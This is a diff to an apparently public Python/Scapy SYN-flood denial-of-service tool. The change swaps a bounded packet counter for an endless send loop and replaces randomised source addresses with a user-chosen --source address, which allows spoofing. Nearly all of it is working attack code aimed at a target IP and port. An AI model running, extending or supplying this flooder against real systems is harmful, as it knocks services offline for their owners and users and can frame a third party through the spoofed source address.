@@ -19,17 +19,19 @@ def randInt():
 	return x
 
 
-def SYN_Flood(dstIP, dstPort, counter):
-	total = 0
+def SYN_Flood(dstIP, srcIP, dstPort):
+	#total = 0
 	print ("Packets are sending ...")
 
-	for x in range (0, counter):
+	#for x in range (0, counter):
+	while True:
 		s_port = randInt()
 		s_eq = randInt()
 		w_indow = randInt()
 
 		IP_Packet = IP ()
-		IP_Packet.src = randomIP()
+		#IP_Packet.src = randomIP()
+		IP_Packet.src = srcIP
 		IP_Packet.dst = dstIP
 
 		TCP_Packet = TCP ()
@@ -40,16 +42,17 @@ def SYN_Flood(dstIP, dstPort, counter):
 		TCP_Packet.window = w_indow
 
 		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
+		#total+=1
 
-	stdout.write("\nTotal packets sent: %i\n" % total)
+	#stdout.write("\rTotal packets sent: %i\n" % total)
 
 
 def main():
 	parser = ArgumentParser()
 	parser.add_argument('--target', '-t', help='target IP address')
 	parser.add_argument('--port', '-p', help='target port number')
-	parser.add_argument('--count', '-c', help='number of packets')
+	#parser.add_argument('--count', '-c', help='number of packets')
+	parser.add_argument('--source', '-s', help='source IP address')
 	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
 	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"
 
@@ -57,12 +60,12 @@ def main():
 
 	if args.target is not None:
 		if args.port is not None:
-			if args.count is None:
-				print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
-				SYN_Flood(args.target, args.port, 1)
+			#if args.count is None:
+			#	print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
+			#	SYN_Flood(args.target, args.port, 1)
 
-			else:
-				SYN_Flood(args.target, args.port, int(args.count))
+			#else:
+			SYN_Flood(args.target, args.source, args.port)
 
 		else:
 			print('[-]Please, use --port/-p to give target\'s port!')
